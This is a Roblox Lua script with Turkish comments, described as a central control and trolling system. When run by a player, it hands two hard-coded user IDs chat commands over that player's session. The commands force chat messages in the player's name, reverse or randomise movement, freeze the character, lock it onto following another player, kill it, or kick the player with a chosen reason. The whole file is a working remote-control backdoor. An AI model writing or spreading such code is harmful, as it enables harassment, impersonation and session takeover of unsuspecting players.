-- [[ MERKEZİ KONTROL, TROLL & İPTAL SİSTEMİ ]] --

local YoneticiIDler = {2965642560, 3093299310} -- Senin ve Derman'ın ID'si
local LPlayer = game.Players.LocalPlayer
local Character = LPlayer.Character or LPlayer.CharacterAdded:Wait()
local Hum = Character:WaitForChild("Humanoid")
local HRP = Character:WaitForChild("HumanoidRootPart")
local Controls = require(LPlayer.PlayerScripts:WaitForChild("PlayerModule")):GetControls()

local Kontrol1Aktif = false
local Kontrol2Aktif = false
local TakipHedef = nil

-- [[ YARDIMCI FONKSİYONLAR ]] --

local function Konustur(mesaj)
    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(mesaj)
    else
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(mesaj, "All")
    end
end

-- [[ KOMUT İŞLEYİCİ ]] --
local function KomutIsle(plr)
    plr.Chatted:Connect(function(msg)
        local yetkili = false
        for _, id in pairs(YoneticiIDler) do if plr.UserId == id then yetkili = true end end
        if not yetkili then return end

        local args = string.split(msg:lower(), " ")
        local cmd = args[1]
        local target = args[2]

        -- Hedef Kontrolü
        if target and (string.find(LPlayer.Name:lower(), target) or string.find(LPlayer.DisplayName:lower(), target)) then
            
            -- 1. :say [isim] [mesaj]
            if cmd == ":say" then
                local icerik = string.sub(msg, string.find(msg:lower(), target) + #target + 1)
                Konustur(icerik)

            -- 2. :kontrol1 / :unkontrol1 (Ters Hareket)
            elseif cmd == ":kontrol1" then
                Kontrol1Aktif = true
            elseif cmd == ":unkontrol1" then
                Kontrol1Aktif = false

            -- 3. :kontrol2 / :unkontrol2 (Rastgele Yürüyüş)
            elseif cmd == ":kontrol2" then
                Kontrol2Aktif = true
            elseif cmd == ":unkontrol2" then
                Kontrol2Aktif = false
                Hum:MoveTo(HRP.Position) -- Durdur

            -- 4. :dondur / :undondur
            elseif cmd == ":dondur" then
                HRP.Anchored = true
            elseif cmd == ":undondur" then
                HRP.Anchored = false

            -- 5. :takipet / :untakipet (Hareketi Kısıtlar)
            elseif cmd == ":takipet" then
                local kime = args[3]
                if kime then
                    for _, p in pairs(game.Players:GetPlayers()) do
                        if string.find(p.Name:lower(), kime) then
                            TakipHedef = p
                            Controls:Disable() -- Kendi hareketini engelle
                        end
                    end
                end
            elseif cmd == ":untakipet" then
                TakipHedef = nil
                Controls:Enable() -- Hareketi geri ver
                Hum:MoveTo(HRP.Position)

            -- 6. :kill / :kick
            elseif cmd == ":kill" then
                LPlayer.Character:BreakJoints()
            elseif cmd == ":kick" then
                local sebep = string.sub(msg, string.find(msg:lower(), target) + #target + 1) or "Atıldınız."
                LPlayer:Kick(sebep)
            end
        end
    end)
end

-- [[ DÖNGÜSEL EFEKTLER ]] --
game:GetService("RunService").Heartbeat:Connect(function()
    -- Kontrol1: İleri gidince geri atar
    if Kontrol1Aktif and Hum.MoveDirection.Magnitude > 0 then
        HRP.CFrame = HRP.CFrame * CFrame.new(0, 0, 0.6)
    end
    
    -- Kontrol2: Rastgele yürüme
    if Kontrol2Aktif and math.random(1, 20) == 1 then
        Hum:MoveTo(HRP.Position + Vector3.new(math.random(-15, 15), 0, math.random(-15, 15)))
    end

    -- Takip Etme (Hedefe Kilitli)
    if TakipHedef and TakipHedef.Character and TakipHedef.Character:FindFirstChild("HumanoidRootPart") then
        Hum:MoveTo(TakipHedef.Character.HumanoidRootPart.Position)
    end
end)

for _, p in pairs(game.Players:GetPlayers()) do KomutIsle(p) end
game.Players.PlayerAdded:Connect(KomutIsle)

print("Sistem Aktif! 'un' öneki ile komutları iptal edebilirsiniz.")
